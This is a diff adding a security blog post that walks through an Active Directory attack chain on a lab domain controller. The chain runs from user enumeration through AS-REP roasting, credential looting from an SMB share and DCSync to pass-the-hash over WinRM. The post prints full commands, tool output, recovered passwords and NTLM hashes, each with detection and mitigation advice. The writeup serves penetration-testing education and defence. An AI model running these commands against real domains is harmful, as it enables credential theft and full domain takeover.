@@ -1,0 +1,676 @@
+<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Active Directory Attack Path Analysis - w4nn4d13</title><meta name="description" content="Technical analysis of vulnerabilities, CVEs, bug bounty discoveries, web application security issues, and remediation guidance."><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="canonical" href="https://w4nn4d13.tech/active-directory-attack-path-analysis/"><link rel="alternate" type="application/atom+xml" href="https://w4nn4d13.tech/feed.xml" title="w4nn4d13 - RSS"><link rel="alternate" type="application/json" href="https://w4nn4d13.tech/feed.json" title="w4nn4d13 - JSON"><meta property="og:title" content="Active Directory Attack Path Analysis"><meta property="og:image" content="https://w4nn4d13.tech/media/website/ChatGPT_Image_Jun_13__2026__04_14_53_PM-removebg-preview.png"><meta property="og:image:width" content="500"><meta property="og:image:height" content="500"><meta property="og:site_name" content="w4nn4d13"><meta property="og:description" content="Technical analysis of vulnerabilities, CVEs, bug bounty discoveries, web application security issues, and remediation guidance."><meta property="og:url" content="https://w4nn4d13.tech/active-directory-attack-path-analysis/"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@0x5t4l1n"><meta name="twitter:title" content="Active Directory Attack Path Analysis"><meta name="twitter:description" content="Technical analysis of vulnerabilities, CVEs, bug bounty discoveries, web application security issues, and remediation guidance."><meta name="twitter:image" content="https://w4nn4d13.tech/media/website/ChatGPT_Image_Jun_13__2026__04_14_53_PM-removebg-preview.png"><link rel="stylesheet" href="https://w4nn4d13.tech/assets/css/style.css?v=d9d3cf91feaa017a6725f497e481fbec"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://w4nn4d13.tech/active-directory-attack-path-analysis/"},"headline":"Active Directory Attack Path Analysis","datePublished":"2026-07-01T21:08+05:30","dateModified":"2026-07-01T21:08+05:30","image":{"@type":"ImageObject","url":"https://w4nn4d13.tech/media/website/ChatGPT_Image_Jun_13__2026__04_14_53_PM-removebg-preview-2.png","height":500,"width":500},"description":"Technical analysis of vulnerabilities, CVEs, bug bounty discoveries, web application security issues, and remediation guidance.","author":{"@type":"Person","name":"w4nn4d13","url":"https://w4nn4d13.tech/authors/w4nn4d13/"},"publisher":{"@type":"Organization","name":"w4nn4d13","logo":{"@type":"ImageObject","url":"https://w4nn4d13.tech/media/website/ChatGPT_Image_Jun_13__2026__04_14_53_PM-removebg-preview-2.png","height":500,"width":500}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-600D0LTNF5"></script><script>window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-600D0LTNF5');</script></head><body class="post-template"><header class="top js-header"><a class="logo" href="https://w4nn4d13.tech/"><img src="https://w4nn4d13.tech/media/website/ChatGPT_Image_Jun_13__2026__04_14_53_PM-removebg-preview-2.png" alt="w4nn4d13" width="500" height="500"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://w4nn4d13.tech/about-this-site/" target="_self">About</a></li><li><a href="https://w4nn4d13.tech/contact/" target="_self">Contact</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>Active Directory Attack Path Analysis</h1><div class="feed__meta content__meta"><a href="https://w4nn4d13.tech/authors/w4nn4d13/" class="feed__author">w4nn4d13</a> <time datetime="2026-07-01T21:08" class="feed__date">July 1, 2026</time></div></div></header></div><div class="entry-wrapper content__entry"><h1><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/ChatGPT-Image-Jul-1-2026-09_06_00-PM.png" alt="" width="1983" height="793" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-2xl.png 1920w"></figure></h1><blockquote><p><span style="color: #e03e2d;"><span style="color: #ba372a;"><strong data-start="2" data-end="17" data-is-only-node="">Disclaimer:</strong></span> </span>This content is intended <strong data-start="43" data-end="110">solely for educational purposes and authorized security testing</strong> in controlled environments. Unauthorized use against systems you do not own or have explicit permission to test is prohibited.</p></blockquote><h2>Introduction</h2><p>Active Directory (AD) remains the dominant identity and access management solution in enterprise environments, making it a primary target during internal penetration tests. A single misconfigured account or overlooked privilege can cascade into full domain compromise. This article presents a methodical AD attack chain  from an unauthenticated position to complete control over a Windows domain  explaining the underlying technology, the commands used, and the defensive gaps that enable each phase.</p><p>The engagement begins with a single IP address and no credentials. The target is a Windows Domain Controller identified by its open ports and service banners. The scenario mirrors common enterprise misconfigurations: legacy authentication settings, weak service account passwords, improper delegation of replication privileges, and reliance on NTLM pass-the-hash vectors.</p><p>The following sections walk through each phase of the attack, with an emphasis on the <em>why</em> behind each technique and the <em>how</em> to detect or prevent it.</p><h2>Network Reconnaissance</h2><p>Every penetration test begins with discovery. The goal of this phase is to identify the target's role, operating system, domain affiliation, and the services it exposes to the network.</p><pre><code>nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001 -sV -T4 &lt;TARGET_IP&gt;
+</code></pre><p>This scan targets the standard Active Directory service ports. Each port corresponds to a specific protocol essential to domain operations:</p><ul><li><strong>53/TCP (DNS):</strong> Domain Name Service is integral to AD for locating domain controllers and resolving domain resources.</li><li><strong>88/TCP (Kerberos):</strong> The core authentication protocol for AD. Kerberos issues tickets that grant access to domain resources without re-entering credentials.</li><li><strong>135/TCP (RPC Endpoint Mapper):</strong> Used by Windows for inter-process communication and service discovery.</li><li><strong>389/TCP (LDAP):</strong> Lightweight Directory Access Protocol — the primary query interface for reading and writing to the AD database.</li><li><strong>445/TCP (SMB):</strong> Server Message Block — the file-sharing and named-pipe transport protocol. SMB is frequently abused for enumeration, credential harvesting, and lateral movement.</li><li><strong>5985/TCP (WinRM):</strong> Windows Remote Management — provides remote PowerShell and command execution capabilities over HTTP.</li></ul><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-40-53.png" alt="" width="1039" height="506" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-2xl.png 1920w"></figure><pre><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+                              (Domain: spookysec.local)
+445/tcp   open  microsoft-ds
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
+</code></pre><p>The LDAP banner leaks the domain name (<code>spookysec.local</code>). The presence of Kerberos, LDAP, and SMB on a single host, combined with port 5985 (WinRM) and 3389 (RDP), identifies this system as a Domain Controller running Windows Server 2019 (build 17763).</p><p><strong>Why this matters:</strong> Identifying a Domain Controller early informs every subsequent decision. All Kerberos requests, LDAP queries, and SMB interactions will be directed at this host using the discovered domain name.</p><h2>Domain Enumeration</h2><p>With the domain name identified, the next step is to verify domain controller properties and confirm the attack surface via SMB negotiation.</p><pre><code>netexec smb &lt;TARGET_IP&gt;
+</code></pre><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-42-39.png" alt="" width="1533" height="71" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-2xl.png 1920w"></figure><p>The <code>netexec</code> tool (formerly CrackMapExec) sends an SMB protocol negotiation request. The response from the server includes the NetBIOS domain name, the DNS domain name, the hostname, the operating system version, and whether SMB signing is enforced.</p><pre><code>SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64
+              (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
+</code></pre><p>Key findings:</p><ul><li><strong>Domain:</strong> <code>spookysec.local</code></li><li><strong>Hostname:</strong> <code>ATTACKTIVEDIREC</code></li><li><strong>OS Build:</strong> 17763 (Windows Server 2019)</li><li><strong>SMB Signing:</strong> Enabled (mutual authentication required for SMB connections)</li><li><strong>SMBv1:</strong> Disabled (a positive security finding — SMBv1 was disabled by default after MS17-010)</li></ul><p><strong>SMB signing</strong> being enabled means NTLM relay attacks against SMB targets will not work between signed hosts, but it does not prevent authenticated SMB access or Kerberos-based attacks.</p><h2>User Enumeration</h2><p>With a domain name but no credentials, the next objective is to discover valid user accounts. Kerberos provides an ideal oracle for this purpose because its error codes differ between existing and non-existing accounts.</p><h3>Kerberos User Enumeration with Kerbrute</h3><p>The Kerberos protocol defines specific error messages during the authentication service request (AS-REQ) phase:</p><ul><li><strong>KRB5KDC_ERR_PREAUTH_REQUIRED (0x25):</strong> The user exists but pre-authentication is required. This is the normal response for a valid user.</li><li><strong>KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN (0x6):</strong> The user does not exist in the domain.</li></ul><p>These distinct responses allow unauthenticated enumeration of domain users by simply sending AS-REQ messages with candidate usernames and observing the error code returned.</p><pre><code>kerbrute userenum -d spookysec.local --dc &lt;TARGET_IP&gt; /wordlists/users.txt
+</code></pre><pre><code>2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  james@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  svc-admin@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  robin@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  darkstar@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  administrator@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  backup@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  paradox@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  ori@spookysec.local
+</code></pre><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-45-44.png" alt="" width="724" height="539" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-2xl.png 1920w"></figure><p>Eight valid domain users are identified. Among them, <code>svc-admin</code> and <code>backup</code> stand out as potentially privileged service accounts. The <code>administrator</code> account is also confirmed, which is valuable for later pass-the-hash validation.</p><p><strong>Why this matters:</strong> Without this enumeration step, subsequent AS-REP roasting attempts would be blind. Knowing which accounts exist enables targeted attacks against misconfigured users.</p><h3>Defensive Consideration</h3><p>Kerbrute enumeration cannot be prevented by disabling pre-authentication alone — it exploits the fundamental Kerberos error code differentiation. Defenses include:</p><ul><li>Monitoring Event ID 4768 (Kerberos TGT requested) for anomalous volumes of AS-REQ failures from a single source.</li><li>Enabling Kerberos armoring (FAST) where supported, which protects the initial AS-REQ exchange.</li><li>Restricting network access to port 88/TCP to only authorized domain members.</li></ul><h2>AS-REP Roasting</h2><h3>Background: Kerberos Pre-Authentication</h3><p>In standard Kerberos authentication, the Authentication Service Request (AS-REQ) includes a timestamp encrypted with the user's NTLM hash. This pre-authentication data proves to the Key Distribution Center (KDC) that the requester knows the user's password before any ticket is issued. If the KDC cannot decrypt the timestamp, it refuses the request.</p><p>However, Active Directory allows accounts to be configured with the <strong>"Do not require Kerberos pre-authentication"</strong> flag (<code>UF_DONT_REQUIRE_PREAUTH</code>). This legacy setting was originally designed for compatibility with non-Windows Kerberos implementations that could not perform pre-authentication. When this flag is set, the KDC will issue an encrypted Ticket Granting Ticket (TGT) to <strong>anyone</strong> who requests one for that user — without any proof of password knowledge.</p><h3>The Attack</h3><p>The TGT returned by the KDC is encrypted with the user's NTLM hash. An attacker who captures this TGT can extract the encrypted portion and attempt to crack it offline using a dictionary or brute-force attack.</p><pre><code></code><code>a.py spookysec.local/ -dc-ip &lt;TARGET_IP&gt; -usersfile valid_users.txt -request -format hashcat
+</code></pre><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/2026-07-01_20-48.png" alt="" width="1905" height="274" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-2xl.png 1920w"></figure><p>This tool from the Impacket suite sends an AS-REQ for each user <strong>without</strong> pre-authentication data. If the user has the <code>DONT_REQUIRE_PREAUTH</code> flag set, the KDC returns an AS-REP containing an encrypted TGT. The output is formatted for Hashcat (mode 18200).</p><pre><code>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e2ff9604df420fa561af327bfb1f3540$...
+[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User robin doesn't have UF_DONT_REQUIR_PREAUTH se
+...
+</code></pre><p>Only <code>svc-admin</code> has the pre-authentication flag disabled. The returned hash is then cracked using Hashcat in mode 18200 (Kerberos 5 AS-REP etype 23 — RC4-HMAC):</p><pre><code>hashcat -m 18200 hash.txt /wordlists/passwords.txt --force
+</code></pre><pre><code>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...:management2005
+</code></pre><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-51-34-2.png" alt="" width="1910" height="902" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-2xl.png 1920w"></figure><p><strong>Recovered credential:</strong> <code>svc-admin:management2005</code></p><h3>Why This Worked</h3><p>The <code>svc-admin</code> account had two exploitable conditions:</p><ol><li><strong>Kerberos pre-authentication disabled</strong> — allowing unauthenticated TGT requests.</li><li><strong>Weak password (<code>management2005</code>)</strong> — the RC4-HMAC hash was cracked near-instantly against a modest wordlist.</li></ol><h3>Detection</h3><table><thead><tr><th>Artifact</th><th>Source</th><th>Event ID</th></tr></thead><tbody><tr><td>Kerberos TGT request without pre-auth</td><td>Domain Controller Security Log</td><td>4768 (with Pre-Authentication field = false)</td></tr><tr><td>AS-REP hash retrieval (TGS-REQ for unusual SPN)</td><td>Domain Controller</td><td>4769</td></tr></tbody></table><h3>Mitigation</h3><ol><li><p>Audit all accounts with <code>DONT_REQUIRE_PREAUTH</code> set using PowerShell:</p><pre><code class="language-powershell">Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+</code></pre></li><li><p>Enable pre-authentication on any account that does not require it for legacy compatibility.</p></li><li><p>Enforce strong password policies for all service accounts.</p></li><li><p>Use Group Managed Service Accounts (gMSAs) for services where possible.</p></li></ol><h2>SMB Enumeration</h2><p>With valid credentials (<code>spookysec.local\svc-admin:management2005</code>), the next phase is to enumerate accessible resources on the domain controller.</p><h3>Enumerating Network Shares</h3><p>SMB shares often contain configuration files, scripts, backups, or other sensitive data. The <code>--shares</code> flag enumerates all available shares and their access permissions.</p><pre><code>netexec smb &lt;TARGET_IP&gt; -u 'svc-admin' -p 'management2005' --shares
+</code></pre><pre><code>SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  Share           Permissions
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  -----           -----------
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  ADMIN$          (Remote Admin)
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  backup          READ
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  IPC$            READ
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  NETLOGON        READ
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  SYSVOL          READ
+</code></pre><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-54-25.png" alt="" width="1544" height="259" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-2xl.png 1920w"></figure><p>The <code>backup</code> share is notable — it is not a default AD share (unlike ADMIN$, C$, NETLOGON, SYSVOL, and IPC$) and appears to be custom-created. It is readable by svc-admin.</p><h3>Accessing the Backup Share</h3><pre><code>smbclient //&lt;TARGET_IP&gt;/backup -U 'spookysec.local\svc-admin'
+</code></pre><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-56-02.png" alt="" width="997" height="620" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-2xl.png 1920w"></figure><p>Inside the share, a single file is found:</p><pre><code>backup_credentials.txt    (48 bytes)
+</code></pre><p>Downloading and examining the file reveals a Base64-encoded string:</p><pre><code>YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+</code></pre><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-57-25.png" alt="" width="1291" height="620" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-2xl.png 1920w"></figure><p>Base64 is a binary-to-text encoding scheme, not encryption. Decoding is trivial:</p><pre><code>backup@spookysec.local:backup2517860
+</code></pre><p>This yields credentials for the <code>backup</code> domain user.</p><h3>Why This Worked</h3><ul><li>Plaintext credentials were stored in an SMB share accessible to a low-privilege service account.</li><li>The file used Base64 encoding, which provides no real security — it is easily reversible by anyone with access to the file.</li><li>The share was readable by <code>svc-admin</code>, which should never have access to backup credentials.</li></ul><h3>Detection</h3><ul><li>Monitor Event ID 5140 (share object accessed) for anomalous access to non-standard shares.</li><li>Audit file permission changes on sensitive shares.</li></ul><h3>Mitigation</h3><ul><li>Never store credentials in SMB shares accessible to non-privileged accounts.</li><li>Use Windows Credential Manager, LAPS, or a secrets management solution (e.g., HashiCorp Vault).</li><li>Restrict share permissions using the principle of least privilege.</li><li>Encrypt sensitive files at rest; Base64 does not constitute encryption.</li></ul><h2>Privilege Escalation: DCSync</h2><h3>Background: Active Directory Replication</h3><p>Domain Controllers replicate their database (NTDS.dit) among themselves using the Directory Replication Service (DRS) protocol, exposed via the MS-DRSR RPC interface. This replication mechanism allows DCs to synchronize password hashes, group memberships, and all other directory objects.</p><p>Certain accounts — notably those in the <code>Domain Controllers</code> group and accounts delegated with specific replication rights — can initiate replication requests. Two extended rights control this capability:</p><ul><li><strong>DS-Replication-Get-Changes</strong> (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd1)</li><li><strong>DS-Replication-Get-Changes-All</strong> (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd1)</li></ul><p>An account with these rights can impersonate a Domain Controller and request replication of the entire AD database, including all password hashes. This is the <strong>DCSync</strong> attack.</p><h3>Executing DCSync</h3><p>The <code>backup</code> account was configured with these replication rights. This is a known pattern — backup software often requires the ability to read all directory objects, and the easiest way to grant this is through the "Replicating Directory Changes All" permission on the domain root.</p><pre><code>netexec smb &lt;TARGET_IP&gt; -u 'backup' -p 'backup2517860' --ntds
+</code></pre><pre><code>SMB   &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860
+SMB   &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+SMB   &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+SMB   &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+...
+SMB   &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  [+] Dumped 18 NTDS hashes
+</code></pre><figure class="post__image"><img loading="lazy" src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-58-54.png" alt="" width="1910" height="603" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-xs.png 640w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-sm.png 768w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-md.png 1024w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-lg.png 1366w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-xl.png 1600w, https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-2xl.png 1920w"></figure><p>The <code>netexec</code> tool leverages the backup account's replication privileges to request a full copy of the NTDS.dit database. The output contains every domain user's NT hash (the first component after the RID) and LM hash (the first hex string, typically <code>aad3b435b51404eeaad3b435b51404ee</code> indicating "no LM hash stored").</p><p>Of particular interest:</p><ul><li><strong>Administrator NTLM:</strong> <code>0e0363213e37b94221497260b0bcb4fc</code></li><li><strong>krbtgt NTLM:</strong> <code>0e2eb8158c27bed09861033026be4c21</code></li></ul><p>The krbtgt hash is especially sensitive — it is used to sign all Kerberos Ticket Granting Tickets in the domain. Compromise of krbtgt enables <strong>Golden Ticket</strong> attacks, allowing an attacker to forge TGTs for any user (including non-existent ones) indefinitely.</p><h3>Why This Worked</h3><ul><li>The <code>backup</code> account was granted <strong>DS-Replication-Get-Changes-All</strong> on the domain root.</li><li>This is a common misconfiguration when administrators grant backup applications excessive privileges rather than scoping them to specific OUs or using granular delegated permissions.</li><li>The backup account had a weak password (<code>backup2517860</code>) that could itself be cracked if needed.</li></ul><h3>Detection</h3><table><thead><tr><th>Artifact</th><th>Source</th><th>Event ID</th></tr></thead><tbody><tr><td>DS-Replication-Get-Changes-All</td><td>Domain Controller Security Log</td><td>4662 (Access to an Active Directory object)</td></tr><tr><td>Replication attempt from non-DC source</td><td>Directory Service</td><td>4928, 4929</td></tr></tbody></table><p>The key detection signal is a <strong>replication request originating from a non-Domain Controller system</strong>. Domain Controllers replicate among themselves as a matter of course, but a workstation or server should never initiate replication.</p><h3>Mitigation</h3><ol><li><p>Audit the <code>Replicating Directory Changes</code> permissions on the domain root:</p><pre><code class="language-powershell">Get-ACL "AD:DC=spookysec,DC=local" | Select -ExpandProperty Access | Where {$_.ActiveDirectoryRights -match "Replicating"}
+</code></pre></li><li><p>Remove these permissions from all non-DC accounts.</p></li><li><p>Use dedicated backup solutions that do not require DCSync capabilities (e.g., Windows Server Backup).</p></li><li><p>Monitor for Event ID 4662 where the AccessMask corresponds to <code>DS-Replication-Get-Changes</code> (0x100).</p></li></ol><h2>Pass-the-Hash</h2><h3>Background: NTLM Authentication Flow</h3><p>NTLM is a challenge-response authentication protocol. The flow is:</p><ol><li>The client sends a <code>negotiate</code> message requesting authentication.</li><li>The server responds with an 8-byte random challenge.</li><li>The client encrypts this challenge using the user's NTLM hash and sends it back as the <code>authenticate</code> message.</li><li>The server (or a Domain Controller) independently computes the expected response using the stored NTLM hash and compares.</li></ol><p>Critically, <strong>the NTLM hash is the only secret needed to compute the correct response</strong>. The plaintext password is never required. If an attacker possesses the NTLM hash, they can authenticate as that user without knowing the password.</p><h3>Pass-the-Hash via WinRM</h3><p>Windows Remote Management (WinRM) accepts NTLM authentication. With the Administrator's NTLM hash extracted from the DCSync dump, we can authenticate directly:</p><pre><code>netexec winrm &lt;TARGET_IP&gt; -u 'Administrator' -H 0e0363213e37b94221497260b0bcb4fc -d 'spookysec.local' -X 'whoami'
+</code></pre><pre><code>WINRM   &lt;TARGET_IP&gt;  5985  &lt;TARGET_IP&gt;  [+] spookysec.local\Administrator (Pwn3d!)
+WINRM   &lt;TARGET_IP&gt;  5985  &lt;TARGET_IP&gt;  thm-ad\administrator
